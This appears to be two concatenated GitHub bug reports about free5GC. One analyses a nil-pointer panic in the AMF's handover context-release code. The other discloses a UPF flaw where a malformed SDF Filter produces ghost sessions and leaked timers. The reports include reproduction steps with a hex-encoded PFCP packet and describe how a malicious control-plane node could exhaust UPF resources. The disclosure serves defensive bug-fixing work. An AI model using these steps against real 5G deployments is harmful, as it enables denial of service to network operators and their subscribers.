In `NFs/amf/internal/ngap/handler.go`, the `UeContextReleaseHandover` case at line 354–366 (v4.3.0):

```go
case context.UeContextReleaseHandover:
    ran.Log.Infof("Release UE[%s] Context : Release for Handover", amfUe.Supi)
    // TODO: it's a workaround, need to fix it.
    targetRanUe := context.GetSelf().RanUeFindByAmfUeNgapID(ranUe.TargetUe.AmfUeNgapId)
    //                                                       ^^^^^^^^^^^^^^^^^^^^^^^^
    //                                                       TargetUe is nil → PANIC
```

The `TargetUe` field is a **unidirectional** link from source RanUe to target RanUe, established during `handleHandoverRequiredMain`. When the target RanUe (gNB-B side) receives `UEContextReleaseComplete` with `ReleaseAction = UeContextReleaseHandover`, this code assumes the current RanUe also has a `TargetUe` link — but the target RanUe **never** has this link. Only the source RanUe does.

The `ReleaseAction = UeContextReleaseHandover` is set by:
- `handleHandoverFailureMain` (line 1732): `SendUEContextReleaseCommand(targetUe, UeContextReleaseHandover, ...)`
- `handleHandoverCancelMain` (line 1920): `SendUEContextReleaseCommand(targetUe, UeContextReleaseHandover, ...)`

Both functions set this action on the **target** RanUe, whose `TargetUe` is always nil.

All other `TargetUe`/`SourceUe` accesses in `handler.go` (lines 1242, 1648, 1698, 1894, 1934) have proper nil checks. Line 357 is the **only** unprotected access.

## Environment
 - free5GC Version: v4.2.3, v4.3.0
 - OS: Ubuntu 22.04.5 LTS
 - Kernel version: 6.8.0-71-generic
 - go version: 1.21.8
 - UERANSIM Version: v3.2.6

## Trace Files
### Configuration Files
Provide the configuration files.

If you are unsure of what to do, please zip free5gc's `config` folder and upload it here.

### PCAP File
[free5gc-nil-bugs.zip](https://github.com/user-attachments/files/34216931/free5gc-nil-bugs.zip)

[Bugs] UPF vulnerable to SDF Filter parsing failure causing session state inconsistency and resource leakage
items.body: ## Bug Decription A critical vulnerability exists in the free5GC UPF's PFCP handler. When a Session Establishment Request contains an unparsable SDF Filter, the UPF returns a success response to the control plane even though internal component creation has failed. This results in a severe state inconsistency between the control plane (CP) and user plane (UPF). Core Issue: 1.State Inconsistency: The UPF's internal forwarding layer (Gtp5g) fails to create a PDR due to SDF Filter parsing errors and logs the failure. However, the session management layer creates the session structure, starts URR timers for it, and ultimately sends a successful (Cause: 1) session establishment response to the CP. This creates a "ghost session." 2.Resource Leakage: Although the PDR creation failure renders the session incapable of forwarding user data, the periodic URR timer (new ticker [10s]) allocated for this session continues to run in the background, consuming CPU and memory resources without the possibility of automatic cleanup. 3.Misleading Response: An attacker or malicious CP node can exploit this vulnerability by sending session requests with illegal SDF Filter parameters, creating a large number of invalid sessions within the UPF, leading to resource exhaustion and service degradation. ## To Reproduce Steps to reproduce the behavior: 1. Start free5gC 2. Sending Association Setup Request (30 bytes): 2005001af886b200003c0005007f00006400600004ed108073005900013f 3. Sending Session Establishment Request (1241 bytes):  ## Expected Behavior The UPF should adhere to the principle of atomic operations. When any critical IE (such as an SDF Filter) in a session establishment request cannot be processed correctly, the UPF should: 1.Reject the Entire Request: It should not create any partial session state and should roll back all allocated resources (including URR timers). 2.Return Accurate Failure Cause: In the PFCP response, the Cause field should be set to a value that reflects the specific
